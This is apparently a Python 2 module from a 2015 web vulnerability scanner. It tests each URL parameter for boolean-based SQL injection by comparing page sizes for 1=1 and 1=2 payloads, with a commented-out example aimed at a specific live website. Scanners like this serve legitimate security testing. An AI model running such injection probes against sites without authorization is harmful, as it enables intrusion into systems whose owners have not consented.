#!/usr/bin/env python
# encoding: utf-8
"""
@author:     idhyt
@copyright:  2015 kingsoft. All rights reserved.
@contact:    idhytgg@gmail.com
@date:       2015年3月17日
@description:
"""
import os
import json
import urllib2
import threading
from public.log import log
from lib.parse import web
from lib.parse import url as urlparse

# 多线程开关
IS_MULTI_THREAD = True

# 线程锁
VUL_SIGN = 0
MUTEX = threading.Lock()


# function :  thread lock for check vul_sign
# return : vul_sign = 1 True ; vul_sign = 0 False
def check_vul_sign(timeout=1):
    global VUL_SIGN
    if MUTEX.acquire(timeout):
        if VUL_SIGN == 0:
            MUTEX.release()
            return False
        if VUL_SIGN == 1:
            MUTEX.release()
            return True


# function : set vul_sign = 1 after found vul
# return : 0 -> 1 True; 1 -> 1 False
def set_vul_sign(sign, timeout=1):
    global VUL_SIGN
    if MUTEX.acquire(timeout):
        if VUL_SIGN == 0:
            VUL_SIGN = sign
            MUTEX.release()
            return True
        elif VUL_SIGN == sign:
            MUTEX.release()
            return False


class Thread(threading.Thread):
    """ """
    def __init__(self, func, args):
        super(Thread, self).__init__()
        self.func = func
        self.args = args
        
        if IS_MULTI_THREAD is not True:
            self.func(*self.args)
            
    def run(self):
        self.func(*self.args)


# sql inject
class SqlScan(object):
    def __init__(self, url, proxy):
        self.payloads = json.load(open(os.path.split(os.path.realpath(__file__))[0] + "\\sql_payloads.json"))
        self.url = url
        self.proxy = proxy
        self.inject_1_equ_1 = self.payloads["equ_1_1"][0]
        self.inject_1_equ_2 = self.payloads["equ_1_2"][0]
        
        self.url_parse = urlparse.UrlParse()
        self.web_site = web.WebSite(self.proxy)
        
        self.result = []
        self.server_info = {}
        self.sql_go()

    # function : get target server info
    # return : None
    def get_server_info(self):
        log.output_log("[inject url] " + self.url, True)
        self.server_info = self.web_site.get_server_info(self.url)
        log.output_log("[*] the type of server is : " + self.server_info["server"])
        log.output_log("[*] the type of web powered by " + self.server_info["x-powered-by"])
        log.output_log("[*] please wait......")
    
    # function : test sql inject by ret page size
    # return : None
    def test_page_size(self, inject_url1, inject_url2):
        if check_vul_sign() is True:
            return
        log.output_log("[test] inject url 1=1 " + inject_url1), log.output_log("[test] inject url 1=2 " + inject_url2)
        url_ret_page_size = self.web_site.get_page_size(self.url)
        url_ret_page_size_1 = self.web_site.get_page_size(inject_url1)
        url_ret_page_size_2 = self.web_site.get_page_size(inject_url2)
        if url_ret_page_size == url_ret_page_size_1 and url_ret_page_size != url_ret_page_size_2:
            self.get_server_info()
            self.result_dispose("[%s] [%s] [server:%s + web:%s] %s" % (
                                "sqlinject", self.inject_1_equ_2,
                                self.server_info["server"], self.server_info["x-powered-by"],
                                inject_url2))
    
    def result_dispose(self, str_result):
        if set_vul_sign(1) is True:
            self.result.append(str_result)
            log.output_log(str_result, True)

    # function : sql inject test begin
    # return : None
    def sql_go(self):
        # self.get_server_info()
        # 对于http://www.xxx.com/?id=1&name=str&title=22每个参数进行测试
        test_params_1 = self.url_parse.get_params(self.url, urllib2.quote(self.inject_1_equ_1))
        test_params_2 = self.url_parse.get_params(self.url, urllib2.quote(self.inject_1_equ_2))
        
        # ---------------------- 多线程切换 -----------------------------------------
        if IS_MULTI_THREAD is True:
            threads = [Thread(
                self.test_page_size,
                (self.url.replace(i, test_params_1[i]),
                 self.url.replace(i, test_params_2[i]))) for i in test_params_1]
            for i in threads:
                i.start()
            for i in threads:
                i.join()
        else:
            for i in test_params_1:
                inject_url1, inject_url2 = self.url.replace(i, test_params_1[i]), self.url.replace(i, test_params_2[i])
                Thread(self.test_page_size, (inject_url1, inject_url2))

'''
def sql_scan(url):
    sql = SqlScan(url)
    if len(sql.result) > 0 : parse.output_result(sql.result)
    
if __name__ == '__main__':
    sql_scan("http://tchjbh.gotoip3.com/news_display.php?id=148")
    pass
'''
    
    
    